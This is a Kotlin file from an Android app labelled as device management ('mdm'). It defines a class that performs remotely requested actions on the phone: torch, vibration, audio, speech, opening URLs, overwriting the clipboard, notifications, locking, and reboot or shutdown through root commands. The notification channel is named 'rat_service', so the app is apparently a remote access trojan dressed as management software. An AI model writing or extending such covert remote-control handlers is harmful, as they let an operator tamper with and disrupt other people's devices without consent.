package com.mycontrol.mdm.managers

import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import java.util.Locale

class ActionManager(private val context: Context) {
    private var tts: TextToSpeech? = null
    private var mediaPlayer: MediaPlayer? = null

    fun toggleFlashlight(on: Boolean) {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
                val cameraId = cameraManager.cameraIdList[0]
                cameraManager.setTorchMode(cameraId, on)
            }
        } catch (e: Exception) {}
    }

    fun vibrate(durationMs: Long) {
        try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator
            } else {
                context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                vibrator.vibrate(durationMs)
            }
        } catch (e: Exception) {}
    }

    fun playAudio(audioPath: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(audioPath)
                setOnCompletionListener { release() }
                prepare()
                start()
            }
        } catch (e: Exception) {}
    }

    fun speak(text: String) {
        if (tts == null) {
            tts = TextToSpeech(context) { status ->
                if (status == TextToSpeech.SUCCESS) {
                    tts?.language = Locale.US
                    tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
                }
            }
        } else {
            tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
        }
    }

    fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) {}
    }

    fun showToast(message: String) {
        Toast.makeText(context, message, Toast.LENGTH_LONG).show()
    }

    fun setClipboard(text: String) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = android.content.ClipData.newPlainText("text", text)
        clipboard.setPrimaryClip(clip)
    }

    fun pushNotification(params: Any?) {
        try {
            val data = params as? Map<*, *>
            val title = data?.get("title")?.toString() ?: "Alert"
            val text = data?.get("text")?.toString() ?: ""
            
            val notification = NotificationCompat.Builder(context, "rat_service")
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build()
            
            NotificationManagerCompat.from(context).notify(System.currentTimeMillis().toInt(), notification)
        } catch (e: Exception) {}
    }

    fun lockDevice() {
        try {
            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                km.lock(null)
            }
        } catch (e: Exception) {}
    }

    fun rebootDevice() {
        try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
        } catch (e: Exception) {}
    }

    fun shutdownDevice() {
        try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", "poweroff"))
        } catch (e: Exception) {}
    }
}
